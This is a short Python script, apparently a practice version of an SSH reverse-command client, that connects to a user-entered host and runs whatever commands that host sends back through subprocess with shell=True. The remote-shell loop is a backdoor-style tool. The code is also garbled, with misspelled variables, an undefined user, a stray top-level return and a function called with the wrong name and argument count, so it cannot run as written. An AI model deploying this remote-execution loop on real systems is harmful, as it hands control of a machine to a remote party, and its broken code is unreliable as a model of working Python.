import paramiko
import shlex
import subprocess

def ssh_comand(ip, port, passwd, cmd):
    client = paramiko .SSHClient()
    cleint.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password-passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
    
    print(ssh_session.recv(1024).decode())
    while True:
        command = ssh_session.recv(1024)
        try:
            cmd = command.decode()
            if cmd == 'exit':
                client.close()
                break
            cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
            ssh_session.send(cmd_output or 'okay')
        except Exception as e:
            shh_session.send(str(e))
    client.close()
return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()

    ip = input('Enter server: ') 
    port = input('Enter port: ') 
    cmd = input('Enter command: ')
    ssh_command(ip, port, user, password, 'ClientConnected')
